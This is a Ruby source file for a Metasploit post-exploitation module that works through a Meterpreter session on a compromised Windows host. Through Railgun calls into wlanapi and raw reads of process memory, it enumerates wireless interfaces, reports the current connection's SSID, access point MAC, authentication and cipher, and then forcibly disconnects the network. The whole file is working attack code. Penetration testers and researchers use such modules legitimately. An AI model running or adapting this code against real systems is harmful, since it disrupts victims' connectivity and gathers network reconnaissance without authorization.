##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Disconnect Wireless Connection',
			'Description'   => %q{
				This module disconnects the current wireless network connection
				on the specified interface.
			},
			'License'       => MSF_LICENSE,
			'Author'        => ['theLightCosine'],
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options([
			OptInt.new("Interface", [true, "The Index of the Interface to Disconnect. Leave at 0 if only one IF", 0])
		])
	end

	def run

		#Opens memory access into the host process
		mypid = client.sys.process.getpid
		@host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)
		@wlanapi = client.railgun.wlanapi

		wlan_connections= "Wireless LAN Active Connections: \n"
		wlan_handle = open_handle()
		unless wlan_handle
			print_error("Couldn't open WlanAPI Handle. WLAN API may not be installed on target")
			print_error("On Windows XP this could also mean the Wireless Zero Configuration Service is turned off")
			return
		end
		wlan_iflist = enum_interfaces(wlan_handle)
		if wlan_iflist[datastore['Interface']]
			connect_info = query_current_connection(wlan_handle, wlan_iflist[datastore['Interface']]['guid'])
			if connect_info
				guid = guid_to_string(wlan_iflist[datastore['Interface']]['guid'])
				wlan_connection = "GUID: #{guid} \nDescription: #{wlan_iflist[datastore['Interface']]['description']} \nState: #{wlan_iflist[datastore['Interface']]['state']}\n"
				wlan_connection << "Currently Connected to: \n"
				wlan_connection << "\tMode: #{connect_info['mode']} \n\tProfile: #{connect_info['profile']} \n"
				wlan_connection << "\tSSID: #{connect_info['ssid']} \n\tAP MAC: #{connect_info['bssid']} \n"
				wlan_connection << "\tBSS Type: #{connect_info['type']} \n\tPhysical Type: #{connect_info['physical']} \n"
				wlan_connection << "\tSignal Strength: #{connect_info['signal']} \n\tRX Rate: #{connect_info['rxrate']} \n"
				wlan_connection << "\tTX Rate: #{connect_info['txrate']} \n\tSecurity Enabled: #{connect_info['security']} \n"
				wlan_connection << "\toneX Enabled: #{connect_info['oneX']} \n\tAuthentication Algorithm: #{connect_info['auth']} \n"
				wlan_connection << "\tCipher Algorithm: #{connect_info['cipher']} \n"
				print_status(wlan_connection)

				print_status("Disconnecting...")
				@wlanapi.WlanDisconnect(wlan_handle,wlan_iflist[datastore['Interface']]['guid'],nil)
				sleep(10)

				connected = query_current_connection(wlan_handle, wlan_iflist[datastore['Interface']]['guid'])
				if connected
					print_error("The Interface still appears to be connected.")
					closehandle = @wlanapi.WlanCloseHandle(wlan_handle,nil)
					if closehandle['return'] == 0
						print_status("WlanAPI Handle Closed Successfully")
					else
						print_error("There was an error closing the Handle")
					end
					return
				else
					print_good("The Interface has been disconnected successfully")
				end
			else
				print_error("This Interface is not currently connected to a network.")
				closehandle = @wlanapi.WlanCloseHandle(wlan_handle,nil)
				if closehandle['return'] == 0
					print_status("WlanAPI Handle Closed Successfully")
				else
					print_error("There was an error closing the Handle")
				end
				return
			end
		else
			print_error("The Supplied Interface Index is Invalid")
			closehandle = @wlanapi.WlanCloseHandle(wlan_handle,nil)
			if closehandle['return'] == 0
				print_status("WlanAPI Handle Closed Successfully")
			else
				print_error("There was an error closing the Handle")
			end
			return
		end

		#close the Wlan API Handle
		closehandle = @wlanapi.WlanCloseHandle(wlan_handle,nil)
		if closehandle['return'] == 0
			print_status("WlanAPI Handle Closed Successfully")
		else
			print_error("There was an error closing the Handle")
		end
	end


	def open_handle
		begin
			wlhandle = @wlanapi.WlanOpenHandle(2,nil,4,4)
		rescue
			return nil
		end
		return wlhandle['phClientHandle']
	end

	def query_current_connection(wlan_handle, guid)
		connection={}
		conn_info = @wlanapi.WlanQueryInterface(wlan_handle,guid,7,nil,4,4,nil)

		#Grab the pointer to our data structure. We skip voer the Interface State since we already have it
		#We interpret the connection mode used first
		pointer = conn_info['ppData']
		pointer = (pointer + 4)
		mode = @host_process.memory.read(pointer,4)
		mode = mode.unpack("V")[0]
		case mode
			when 0
				connection['mode'] = "A profile is used to make the connection."
			when 1
				connection['mode'] = "A temporary profile is used to make the connection."
			when 2
				connection['mode'] = "Secure discovery is used to make the connection."
			when 3
				connection['mode'] = "Unsecure discovery is used to make the connection."
			when 4
				connection['mode'] = "connection initiated by wireless service automatically using a persistent profile."
			when 5
				connection['mode'] = "Invalid connection mode."
			else
				connection['state'] = "Unknown connection Mode."
		end

		#Grab the wirelessprofile name used in the connection
		pointer = (pointer+4)
		profile = @host_process.memory.read(pointer,512)
		connection['profile'] = profile.gsub(/\x00/,"")

		#Check the size of the SSID value. If we get nothing back, the interface is not currently connected
		#We return nil and deal with the results back in the calling function
		pointer = (pointer+512)
		len_ssid = @host_process.memory.read(pointer,4)
		unless len_ssid.unpack("V")[0]
			return nil
		end

		#Grabs the SSID of the BSS connected to
		pointer = (pointer + 4)
		ssid = @host_process.memory.read(pointer,32)
		connection['ssid'] = ssid.gsub(/\x00/,"")

		#Grabs what type of a BSS this is and itnerpretes it into human readable
		pointer = (pointer + 32)
		bsstype = @host_process.memory.read(pointer,4)
		bsstype = bsstype.unpack("V")[0]
		case bsstype
			when 1
				connection['type'] = "Infrastructure"
			when 2
				connection['type'] = "Independent"
			when 3
				connection['type'] = "Any"
			else
				connection['type'] = "Unknown BSS Type"
		end

		#Grabs the BSS MAC address
		pointer = (pointer + 4)
		bssid = @host_process.memory.read(pointer,6)
		bssid = bssid.unpack("H*")[0]
		bssid.insert(2,":")
		bssid.insert(5,":")
		bssid.insert(8,":")
		bssid.insert(11,":")
		bssid.insert(14,":")
		connection['bssid'] = bssid

		#Grabs the physical association type and interprets it into human readable
		pointer = (pointer + 8)
		phy_type = @host_process.memory.read(pointer,4)
		phy_type = phy_type.unpack("V")[0]
		case phy_type
			when 1
				connection['physical'] = "Frequency-hopping spread-spectrum (FHSS)"
			when 2
				connection['physical'] = "Direct sequence spread spectrum (DSSS)"
			when 3
				connection['physical'] = "Infrared (IR) baseband"
			when 4
				connection['physical'] = "Orthogonal frequency division multiplexing (OFDM)"
			when 5
				connection['physical'] = "High-rate DSSS (HRDSSS)"
			when 6
				connection['physical'] = "Extended rate PHY type"
			when 7
				connection['physical'] = "802.11n PHY type"
			else
				connection['physical'] = "Unknown Association Type"
		end

		#Grabs the signal strength value
		pointer = (pointer + 8)
		signal = @host_process.memory.read(pointer,4)
		connection['signal'] = signal.unpack("V")[0]

		#Grabs the recieve rate value
		pointer = (pointer + 4)
		rxrate = @host_process.memory.read(pointer,4)
		connection['rxrate'] = rxrate.unpack("V")[0]

		#Grabs the transmit rate value
		pointer = (pointer + 4)
		txrate = @host_process.memory.read(pointer,4)
		connection['txrate'] = txrate.unpack("V")[0]

		#Checks if security is enabled on this BSS
		pointer = (pointer + 4)
		security_enabled = @host_process.memory.read(pointer,4)
		if security_enabled.unpack("V")[0] == 1
			connection['security'] = "Yes"
		else
			connection['security'] = "No"
		end

		#Checks of 802.1x Authentication is used
		pointer = (pointer + 4)
		onex = @host_process.memory.read(pointer,4)
		if onex.unpack("V")[0] == 1
			connection['oneX'] = "Yes"
		else
			connection['oneX'] = "No"
		end

		#Determines wat Authentication Algorithm is being used
		pointer = (pointer + 4)
		algo = @host_process.memory.read(pointer,4)
		algo = algo.unpack("V")[0]
		case algo
			when 1
				connection['auth'] = "802.11 Open"
			when 2
				connection['auth'] = "802.11 Shared"
			when 3
				connection['auth'] = "WPA"
			when 4
				connection['auth'] = "WPA-PSK"
			when 5
				connection['auth'] = "WPA-None"
			when 6
				connection['auth'] = "RSNA"
			when 7
				connection['auth'] = "RSNA with PSK"
			else
				connection['auth'] = "Unknown Algorithm"
		end

		#Determines what Cipher is being used
		pointer = (pointer + 4)
		cipher = @host_process.memory.read(pointer,4)
		cipher = cipher.unpack("V")[0]
		case cipher
			when 0
				connection['cipher'] = "None"
			when 1
				connection['cipher'] = "WEP-40"
			when 2
				connection['cipher'] = "TKIP"
			when 4
				connection['cipher'] = "CCMP"
			when 5
				connection['cipher'] = "WEP-104"
			when 256
				connection['cipher'] = "Use Group Key"
			when 257
				connection['cipher'] = "WEP"
			else
				connection['cipher'] = "Unknown Cipher"
		end
		return connection
	end


	def enum_interfaces(wlan_handle)
		iflist = @wlanapi.WlanEnumInterfaces(wlan_handle,nil,4)
		pointer= iflist['ppInterfaceList']

		numifs = @host_process.memory.read(pointer,4)
		numifs = numifs.unpack("V")[0]
		interfaces = []

		#Set the pointer ahead to the first element in the array
		pointer = (pointer + 8)
		(1..numifs).each do |i|
			interface = {}
			#Read the GUID (16 bytes)
			interface['guid'] = @host_process.memory.read(pointer,16)
			pointer = (pointer + 16)
			#Read the description(up to 512 bytes)
			interface['description'] = @host_process.memory.read(pointer,512)
			pointer = (pointer + 512)
			#Read the state of the interface (4 bytes)
			state = @host_process.memory.read(pointer,4)
			pointer = (pointer + 4)

			#Turn the state into human readable form
			state = state.unpack("V")[0]
			case state
				when 0
					interface['state'] = "The interface is not ready to operate."
				when 1
					interface['state'] = "The interface is connected to a network."
				when 2
					interface['state'] = "The interface is the first node in an ad hoc network. No peer has connected."
				when 3
					interface['state'] = "The interface is disconnecting from the current network."
				when 4
					interface['state'] = "The interface is not connected to any network."
				when 5
					interface['state'] = "The interface is attempting to associate with a network."
				when 6
					interface['state'] = "Auto configuration is discovering the settings for the network."
				when 7
					interface['state'] = "The interface is in the process of authenticating."
				else
					interface['state'] = "Unknown State"
			end
			interfaces << interface
		end
		return interfaces
	end

	#Convert the GUID to human readable form
	def guid_to_string(guid)
		aguid = guid.unpack("H*")[0]
		sguid = "{" + aguid[6,2] + aguid[4,2] + aguid[2,2] + aguid[0,2]
		sguid << "-" + aguid[10,2] +  aguid[8,2] + "-" + aguid[14,2] + aguid[12,2] + "-" +  aguid[16,4]
		sguid << "-" + aguid[20,12] + "}"
		return sguid
	end

end
